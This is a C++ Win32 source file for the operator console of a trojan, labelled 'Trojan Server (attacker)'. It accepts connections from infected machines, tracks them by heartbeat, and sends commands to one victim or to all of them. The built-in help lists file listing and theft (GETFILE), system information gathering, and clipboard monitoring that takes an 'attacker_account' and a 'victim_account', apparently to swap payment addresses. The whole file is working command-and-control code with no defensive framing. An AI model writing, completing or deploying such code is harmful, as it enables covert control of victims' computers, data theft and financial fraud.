// server_gui.cpp - Trojan Server (attacker) with GUI
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <commctrl.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <mutex>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")

// Ensure Common Controls v6 for modern look
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Constants
#define DEFAULT_PORT 10000
#define BUFFER_SIZE 4096
#define MAX_LOG_LENGTH 65536

// Window dimensions
#define WINDOW_WIDTH 800
#define WINDOW_HEIGHT 600

// Control IDs
#define ID_LISTVIEW 100
#define ID_EDIT_LOG 101
#define ID_EDIT_COMMAND 102
#define ID_BUTTON_SEND 103
#define ID_BUTTON_SENDALL 104
#define ID_BUTTON_REFRESH 105
#define ID_STATUSBAR 106

// Custom messages
#define WM_ADD_LOG (WM_USER + 1)
#define WM_UPDATE_CLIENTS (WM_USER + 2)

// Structure to hold client information
struct ClientInfo {
    SOCKET socket;
    struct sockaddr_in addr;
    char ipAddress[16];    // To store the IP address as string
    std::string clientId;  // To store the client identifier
    bool connected;        // Flag to track connection status
    DWORD lastHeartbeat;   // Timestamp of last heartbeat
};

// Global variables
std::vector<ClientInfo> clients;
std::mutex clientsMutex;   // Mutex to protect access to the clients vector
WSADATA wsaData;
bool serverRunning = true;
HWND hWndMain;             // Main window handle
HWND hWndListView;         // Listview for clients
HWND hWndLog;              // Edit control for log messages
HWND hWndCommand;          // Edit control for commands
HWND hWndStatusBar;        // Status bar
HINSTANCE hInstance;       // Application instance

// Function prototypes
bool InitializeWinsock();
bool CreateServerSocket(SOCKET& serverSocket, sockaddr_in& serverAddr);
DWORD WINAPI HandleClient(LPVOID lpParam);
void CleanupWinsock();
DWORD WINAPI AcceptConnectionsThread(LPVOID lpParam);
void ListClients();
void SendCommandToClient(int clientIndex, const std::string& command);
void SendCommandToAllClients(const std::string& command);
void RemoveDisconnectedClient(int clientIndex);
DWORD WINAPI HeartbeatMonitorThread(LPVOID lpParam);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void AddLogMessage(const char* format, ...);
void InitializeGUI(HWND hwnd);
void UpdateClientListView();
void SendSelectedClientCommand();
void SendAllClientsCommand();
void DisplayHelp();

// Initialize Winsock
bool InitializeWinsock() {
    WORD wVersionRequested = MAKEWORD(2, 2);
    int result = WSAStartup(wVersionRequested, &wsaData);
    if (result != 0) {
        AddLogMessage("WSAStartup failed: %d", result);
        return false;
    }
    return true;
}

// Create server socket
bool CreateServerSocket(SOCKET& serverSocket, sockaddr_in& serverAddr) {
    // Create socket
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        AddLogMessage("Error creating socket: %d", WSAGetLastError());
        WSACleanup();
        return false;
    }

    // Set up server address
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        AddLogMessage("Bind failed: %d", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return false;
    }

    // Listen for incoming connections
    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        AddLogMessage("Listen failed: %d", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return false;
    }

    return true;
}

// Function to handle client messages
DWORD WINAPI HandleClient(LPVOID lpParam) {
    int clientIndex = *(int*)lpParam;
    delete (int*)lpParam;  // Free memory allocated for clientIndex
    
    char buffer[BUFFER_SIZE];
    int bytesReceived;
    
    ClientInfo client;
    
    // Get client information safely
    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        if (clientIndex >= clients.size()) {
            AddLogMessage("Invalid client index");
            return 1;
        }
        client = clients[clientIndex];
    }
    
    AddLogMessage("Starting handler for client %s", client.ipAddress);
    
    while (serverRunning) {
        // Receive data from client
        bytesReceived = recv(client.socket, buffer, sizeof(buffer), 0);
        
        if (bytesReceived <= 0) {
            // Client disconnected or error occurred
            AddLogMessage("Client %s disconnected", client.ipAddress);
            RemoveDisconnectedClient(clientIndex);
            break;
        }
        
        // Null terminate the received data
        buffer[bytesReceived] = '\0';
        
        std::string message(buffer);
        
        // Process the received data
        if (message.substr(0, 15) == "CLIENT_CONNECT:") {
            // Extract client ID from connection message
            std::string clientId = message.substr(15);
            
            // Update client ID in the vector
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (clientIndex < clients.size()) {
                clients[clientIndex].clientId = clientId;
                clients[clientIndex].lastHeartbeat = GetTickCount();
                AddLogMessage("Client %s identified as: %s", client.ipAddress, clientId.c_str());
                
                // Update client list in UI
                PostMessage(hWndMain, WM_UPDATE_CLIENTS, 0, 0);
            }
        }
        else if (message.substr(0, 10) == "HEARTBEAT:") {
            // Update heartbeat timestamp
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (clientIndex < clients.size()) {
                clients[clientIndex].lastHeartbeat = GetTickCount();
                // No need to log every heartbeat
                AddLogMessage("Heartbeat received from %s (%s)", client.ipAddress, clients[clientIndex].clientId.c_str());
            }
        }
        else {
            // Regular message
            AddLogMessage("Received from %s (%s): %s", 
                client.ipAddress, 
                client.clientId.c_str(), 
                buffer);
        }
    }
    
    return 0;
}


// Display help
void DisplayHelp() {
    AddLogMessage("\nAvailable commands:");
    AddLogMessage("  LIST <dir>       - List files in directory");
    AddLogMessage("  GETFILE <file>   - Get file content");
    AddLogMessage("  SYSINFO          - Get system information");
    AddLogMessage("  PING             - Simple ping test");
    AddLogMessage("  CLIPBOARD_START <attacker_account> [victim_account] - Start clipboard monitoring");
    AddLogMessage("  CLIPBOARD_STOP   - Stop clipboard monitoring");
    AddLogMessage("  CLIPBOARD_STATUS - Get clipboard monitoring status");
}

// Remove disconnected client
void RemoveDisconnectedClient(int clientIndex) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clientIndex >= 0 && clientIndex < clients.size()) {
        closesocket(clients[clientIndex].socket);
        clients.erase(clients.begin() + clientIndex);
        AddLogMessage("Client at index %d removed from the list", clientIndex);
        
        // Update client list in UI
        PostMessage(hWndMain, WM_UPDATE_CLIENTS, 0, 0);
    }
}

// Function to accept clients
DWORD WINAPI AcceptConnectionsThread(LPVOID lpParam) {
    SOCKET serverSocket = *(SOCKET*)lpParam;
    sockaddr_in clientAddr;
    int clientAddrSize = sizeof(clientAddr);

    AddLogMessage("Starting to accept connections...");
    DisplayHelp();
    while (serverRunning) {
        // Accept a connection
        SOCKET clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize);
        
        if (clientSocket == INVALID_SOCKET) {
            AddLogMessage("Accept failed: %d", WSAGetLastError());
            Sleep(1000);  // Short delay to prevent CPU spike on continuous failures
            continue;
        }
        
        // Create client info
        ClientInfo newClient;
        newClient.socket = clientSocket;
        newClient.addr = clientAddr;
        newClient.connected = true;
        newClient.lastHeartbeat = GetTickCount();
        newClient.clientId = "Unknown";  // Will be updated when client sends identification
        
        // Convert IP address to string
        strcpy_s(newClient.ipAddress, inet_ntoa(clientAddr.sin_addr));
        
        // Add client to list
        int newClientIndex;
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients.push_back(newClient);
            newClientIndex = clients.size() - 1;
        }
        
        AddLogMessage("New client connected: %s (Index: %d)", newClient.ipAddress, newClientIndex);
        
        // Update client list in UI
        PostMessage(hWndMain, WM_UPDATE_CLIENTS, 0, 0);
        
        // Create a thread to handle the client
        int* clientIndexPtr = new int(newClientIndex);
        HANDLE hThread = CreateThread(NULL, 0, HandleClient, (LPVOID)clientIndexPtr, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);  // We don't need to track this handle
        } else {
            delete clientIndexPtr;  // Clean up if thread creation failed
            AddLogMessage("Failed to create client handler thread");
        }
    }
    
    return 0;
}

// Thread to monitor client heartbeats
DWORD WINAPI HeartbeatMonitorThread(LPVOID lpParam) {
    const DWORD HEARTBEAT_TIMEOUT =  120000;  // (2 minutes)
    
    while (serverRunning) {
        std::vector<int> clientsToRemove;
        DWORD currentTime = GetTickCount();
        
        // Check for clients without recent heartbeats
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            
            for (int i = 0; i < clients.size(); i++) {
                DWORD timeSinceLastHeartbeat = currentTime - clients[i].lastHeartbeat;
                
                if (timeSinceLastHeartbeat > HEARTBEAT_TIMEOUT) {
                    AddLogMessage("Client %s (%s) timed out (no heartbeat for %d seconds)", 
                        clients[i].ipAddress, 
                        clients[i].clientId.c_str(), 
                        timeSinceLastHeartbeat / 1000);
                    
                    clientsToRemove.push_back(i);
                }
            }
        }
        
        // Remove timed out clients (in reverse order to avoid index issues)
        for (int i = clientsToRemove.size() - 1; i >= 0; i--) {
            RemoveDisconnectedClient(clientsToRemove[i]);
        }
        
        // Check every 30 seconds
        Sleep(30000);
    }
    
    return 0;
}

// List connected clients
void ListClients() {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    AddLogMessage("\n=== Connected Clients (%zu) ===", clients.size());
    
    if (clients.empty()) {
        AddLogMessage("No clients connected");
    } else {
        for (size_t i = 0; i < clients.size(); i++) {
            DWORD currentTime = GetTickCount();
            DWORD timeSinceLastHeartbeat = currentTime - clients[i].lastHeartbeat;
            
            AddLogMessage("%zu: IP: %s, ID: %s, Last heartbeat: %d seconds ago", 
                i, 
                clients[i].ipAddress, 
                clients[i].clientId.c_str(),
                timeSinceLastHeartbeat / 1000);
        }
    }
    
    AddLogMessage("===========================");
}

// Send command to a specific client
void SendCommandToClient(int clientIndex, const std::string& command) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clientIndex >= 0 && clientIndex < clients.size()) {
        if (send(clients[clientIndex].socket, command.c_str(), command.length(), 0) == SOCKET_ERROR) {
            AddLogMessage("Failed to send command to client %d (%s): %d", 
                clientIndex, 
                clients[clientIndex].ipAddress, 
                WSAGetLastError());
        } else {
            AddLogMessage("Command sent to client %d (%s): %s", 
                clientIndex, 
                clients[clientIndex].ipAddress, 
                command.c_str());
        }
    } else {
        AddLogMessage("Invalid client index: %d", clientIndex);
    }
}

// Send command to all connected clients
void SendCommandToAllClients(const std::string& command) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clients.empty()) {
        AddLogMessage("No clients connected");
        return;
    }
    
    for (size_t i = 0; i < clients.size(); i++) {
        if (send(clients[i].socket, command.c_str(), command.length(), 0) == SOCKET_ERROR) {
            AddLogMessage("Failed to send to client %zu (%s): %d", 
                i, 
                clients[i].ipAddress, 
                WSAGetLastError());
        } else {
            AddLogMessage("Command sent to client %zu (%s)", i, clients[i].ipAddress);
        }
    }
}

// Cleanup Winsock
void CleanupWinsock() {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    // Close all client sockets
    for (size_t i = 0; i < clients.size(); i++) {
        closesocket(clients[i].socket);
    }
    
    clients.clear();
    WSACleanup();
}

// Add message to log
void AddLogMessage(const char* format, ...) {
    char buffer[4096];
    va_list args;
    va_start(args, format);
    vsprintf_s(buffer, format, args);
    va_end(args);
    
    // Send message to UI thread
    if (hWndMain) {
        char* pMessage = _strdup(buffer);
        PostMessage(hWndMain, WM_ADD_LOG, 0, (LPARAM)pMessage);
    }
}

// Update client list view
void UpdateClientListView() {
    if (!hWndListView) return;
    
    // Clear the list view
    ListView_DeleteAllItems(hWndListView);
    
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    // Add clients to list view
    for (size_t i = 0; i < clients.size(); i++) {
        DWORD currentTime = GetTickCount();
        DWORD timeSinceLastHeartbeat = currentTime - clients[i].lastHeartbeat;
        
        // Create list view item
        LVITEM lvItem;
        memset(&lvItem, 0, sizeof(LVITEM));
        lvItem.mask = LVIF_TEXT;
        lvItem.iItem = i;
        lvItem.iSubItem = 0;
        
        // Convert index to string
        char indexStr[16];
        sprintf_s(indexStr, "%zu", i);
        lvItem.pszText = indexStr;
        
        // Insert the item
        int itemIndex = ListView_InsertItem(hWndListView, &lvItem);
        
        // Set sub-items (IP, ID, Last Heartbeat)
        ListView_SetItemText(hWndListView, itemIndex, 1, clients[i].ipAddress);
        ListView_SetItemText(hWndListView, itemIndex, 2, (char*)clients[i].clientId.c_str());
        
        // Convert heartbeat time to string
        char heartbeatStr[32];
        sprintf_s(heartbeatStr, "%d sec ago", timeSinceLastHeartbeat / 1000);
        ListView_SetItemText(hWndListView, itemIndex, 3, heartbeatStr);
    }
    
    // Update status bar
    char statusText[64];
    sprintf_s(statusText, "Connected clients: %zu", clients.size());
    SendMessage(hWndStatusBar, SB_SETTEXT, 0, (LPARAM)statusText);
}

// Initialize GUI controls
void InitializeGUI(HWND hwnd) {
    RECT rcClient;
    GetClientRect(hwnd, &rcClient);
    
    // Initialize Common Controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_LISTVIEW_CLASSES | ICC_BAR_CLASSES;
    InitCommonControlsEx(&icex);
    
    // Create list view for clients
    hWndListView = CreateWindowEx(
        0, WC_LISTVIEW, "", 
        WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS | LVS_SINGLESEL,
        10, 10, rcClient.right - 20, 150,
        hwnd, (HMENU)ID_LISTVIEW, hInstance, NULL);
    
    // Add columns to list view
    LVCOLUMN lvc;
    memset(&lvc, 0, sizeof(LVCOLUMN));
    lvc.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
    
    lvc.iSubItem = 0;
    lvc.pszText = (LPSTR)"Index";
    lvc.cx = 50;
    ListView_InsertColumn(hWndListView, 0, &lvc);
    
    lvc.iSubItem = 1;
    lvc.pszText = (LPSTR)"IP Address";
    lvc.cx = 150;
    ListView_InsertColumn(hWndListView, 1, &lvc);
    
    lvc.iSubItem = 2;
    lvc.pszText = (LPSTR)"Client ID";
    lvc.cx = 250;
    ListView_InsertColumn(hWndListView, 2, &lvc);
    
    lvc.iSubItem = 3;
    lvc.pszText = (LPSTR)"Last Heartbeat";
    lvc.cx = 120;
    ListView_InsertColumn(hWndListView, 3, &lvc);
    
    // Set list view extended style
    ListView_SetExtendedListViewStyle(hWndListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
    
    // Create edit control for log messages
    hWndLog = CreateWindowEx(
        WS_EX_CLIENTEDGE, "EDIT", "",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
        10, 170, rcClient.right - 20, rcClient.bottom - 250,
        hwnd, (HMENU)ID_EDIT_LOG, hInstance, NULL);
    
    // Set log edit control font to a fixed-width font
    HFONT hFont = CreateFont(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
        DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN, "Consolas");
    SendMessage(hWndLog, WM_SETFONT, (WPARAM)hFont, TRUE);
    
    // Create edit control for commands
    hWndCommand = CreateWindowEx(
        WS_EX_CLIENTEDGE, "EDIT", "",
        WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
        10, rcClient.bottom - 70, rcClient.right - 320, 25,
        hwnd, (HMENU)ID_EDIT_COMMAND, hInstance, NULL);
    
    // Create send to selected button
    HWND hWndSendButton = CreateWindow(
        "BUTTON", "Send to Selected",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        rcClient.right - 300, rcClient.bottom - 70, 100, 25,
        hwnd, (HMENU)ID_BUTTON_SEND, hInstance, NULL);
    
    // Create send to all button
    HWND hWndSendAllButton = CreateWindow(
        "BUTTON", "Send to All",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        rcClient.right - 190, rcClient.bottom - 70, 80, 25,
        hwnd, (HMENU)ID_BUTTON_SENDALL, hInstance, NULL);
    
    // Create refresh button
    HWND hWndRefreshButton = CreateWindow(
        "BUTTON", "Refresh List",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        rcClient.right - 100, rcClient.bottom - 70, 80, 25,
        hwnd, (HMENU)ID_BUTTON_REFRESH, hInstance, NULL);
    
    // Create status bar
    hWndStatusBar = CreateWindowEx(
        0, STATUSCLASSNAME, NULL,
        WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP,
        0, 0, 0, 0,
        hwnd, (HMENU)ID_STATUSBAR, hInstance, NULL);
    
    // Set status bar parts
    int statwidths[] = {250, 500, -1};
    SendMessage(hWndStatusBar, SB_SETPARTS, 3, (LPARAM)statwidths);
    SendMessage(hWndStatusBar, SB_SETTEXT, 0, (LPARAM)"Connected clients: 0");
    SendMessage(hWndStatusBar, SB_SETTEXT, 1, (LPARAM)"Server started");
    
    // Display help info in log
    DisplayHelp();
}

// Send command to selected client
void SendSelectedClientCommand() {
    // Get selected client index
    int selectedIndex = ListView_GetNextItem(hWndListView, -1, LVNI_SELECTED);
    if (selectedIndex == -1) {
        AddLogMessage("No client selected");
        return;
    }
    
    // Get command text
    char commandText[BUFFER_SIZE];
    GetWindowText(hWndCommand, commandText, BUFFER_SIZE);
    
    if (strlen(commandText) == 0) {
        AddLogMessage("No command specified");
        return;
    }
    
    // Send the command
    SendCommandToClient(selectedIndex, commandText);
    
    // Clear command text
    SetWindowText(hWndCommand, "");
}

// Send command to all clients
void SendAllClientsCommand() {
    // Get command text
    char commandText[BUFFER_SIZE];
    GetWindowText(hWndCommand, commandText, BUFFER_SIZE);
    
    if (strlen(commandText) == 0) {
        AddLogMessage("No command specified");
        return;
    }
    
    // Send the command to all clients
    SendCommandToAllClients(commandText);
    
    // Clear command text
    SetWindowText(hWndCommand, "");
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            // Initialize the GUI
            InitializeGUI(hwnd);
            return 0;
        
        case WM_COMMAND:
            // Handle button clicks
            switch (LOWORD(wParam)) {
                case ID_BUTTON_SEND:
                    SendSelectedClientCommand();
                    return 0;
                
                case ID_BUTTON_SENDALL:
                    SendAllClientsCommand();
                    return 0;
                
                case ID_BUTTON_REFRESH:
                    UpdateClientListView();
                    return 0;
                
                case ID_EDIT_COMMAND:
                    // Handle Enter key in command edit control
                    if (HIWORD(wParam) == EN_CHANGE) {
                        // Check if Enter key was pressed
                        if (GetKeyState(VK_RETURN) & 0x8000) {
                            SendSelectedClientCommand();
                            return 0;
                        }
                    }
                    break;
            }
            break;
        
        case WM_SIZE:
            {
                RECT rcClient;
                GetClientRect(hwnd, &rcClient);
                
                // Resize controls
                MoveWindow(hWndListView, 10, 10, rcClient.right - 20, 150, TRUE);
                MoveWindow(hWndLog, 10, 170, rcClient.right - 20, rcClient.bottom - 250, TRUE);
                MoveWindow(hWndCommand, 10, rcClient.bottom - 70, rcClient.right - 320, 25, TRUE);
                MoveWindow(GetDlgItem(hwnd, ID_BUTTON_SEND), rcClient.right - 300, rcClient.bottom - 70, 100, 25, TRUE);
                MoveWindow(GetDlgItem(hwnd, ID_BUTTON_SENDALL), rcClient.right - 190, rcClient.bottom - 70, 80, 25, TRUE);
                MoveWindow(GetDlgItem(hwnd, ID_BUTTON_REFRESH), rcClient.right - 100, rcClient.bottom - 70, 80, 25, TRUE);
                
                // Resize status bar
                SendMessage(hWndStatusBar, WM_SIZE, 0, 0);
            }
            return 0;
        
        case WM_ADD_LOG:
            {
                // Add message to log
                char* pMessage = (char*)lParam;
                
                // Get current text length
                int textLength = GetWindowTextLength(hWndLog);
                
                // Check if log is getting too long
                if (textLength > MAX_LOG_LENGTH) {
                    // Clear half of the log
                    SetWindowText(hWndLog, "");
                    textLength = 0;
                }
                
                // Move caret to end of text
                SendMessage(hWndLog, EM_SETSEL, textLength, textLength);
                
                // Add new text with newline
                std::string formattedMessage = std::string(pMessage) + "\r\n";
                SendMessage(hWndLog, EM_REPLACESEL, FALSE, (LPARAM)formattedMessage.c_str());
                
                // Scroll to bottom
                SendMessage(hWndLog, EM_SCROLLCARET, 0, 0);
                
                // Free memory allocated for message
                free(pMessage);
            }
            return 0;
        
        case WM_UPDATE_CLIENTS:
            // Update client list view
            UpdateClientListView();
            return 0;
        
        case WM_CLOSE:
            DestroyWindow(hwnd);
            return 0;
        
        case WM_DESTROY:
            // Set flag to stop threads
            serverRunning = false;
            PostQuitMessage(0);
            return 0;
    }
    
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Main function
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    hInstance = hInst;
    
    // Register window class
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = "TrojanServerWindow";
    
    if (!RegisterClass(&wc)) {
        MessageBox(NULL, "Window Registration Failed!", "Error", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }
    
    // Create main window
    hWndMain = CreateWindow(
        "TrojanServerWindow", "Trojan Server",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL, NULL, hInstance, NULL);
    
    if (!hWndMain) {
        MessageBox(NULL, "Window Creation Failed!", "Error", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }
    
    // Initialize Winsock
    if (!InitializeWinsock()) {
        MessageBox(hWndMain, "Failed to initialize Winsock!", "Error", MB_ICONERROR | MB_OK);
        return 1;
    }
    
    // Create server socket
    SOCKET serverSocket;
    sockaddr_in serverAddr;
    if (!CreateServerSocket(serverSocket, serverAddr)) {
        MessageBox(hWndMain, "Failed to create server socket!", "Error", MB_ICONERROR | MB_OK);
        return 1;
    }
    
    // Create thread to accept connections
    HANDLE hAcceptThread = CreateThread(NULL, 0, AcceptConnectionsThread, &serverSocket, 0, NULL);
    if (!hAcceptThread) {
        MessageBox(hWndMain, "Failed to create accept thread!", "Error", MB_ICONERROR | MB_OK);
        CleanupWinsock();
        return 1;
    }
    
    // Create thread to monitor client heartbeats
    HANDLE hHeartbeatThread = CreateThread(NULL, 0, HeartbeatMonitorThread, NULL, 0, NULL);
    if (!hHeartbeatThread) {
        MessageBox(hWndMain, "Failed to create heartbeat monitor thread!", "Warning", MB_ICONWARNING | MB_OK);
        // Continue anyway, as this is not fatal
    }
    
    // Show the window
    ShowWindow(hWndMain, nCmdShow);
    UpdateWindow(hWndMain);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Wait for threads to finish
    serverRunning = false;
    
    // Wait for accept thread to finish (with timeout)
    WaitForSingleObject(hAcceptThread, 5000);
    CloseHandle(hAcceptThread);
    
    // Wait for heartbeat thread to finish (with timeout)
    if (hHeartbeatThread) {
        WaitForSingleObject(hHeartbeatThread, 5000);
        CloseHandle(hHeartbeatThread);
    }
    
    // Close server socket
    closesocket(serverSocket);
    
    // Cleanup
    CleanupWinsock();
    
    return (int)msg.wParam;
}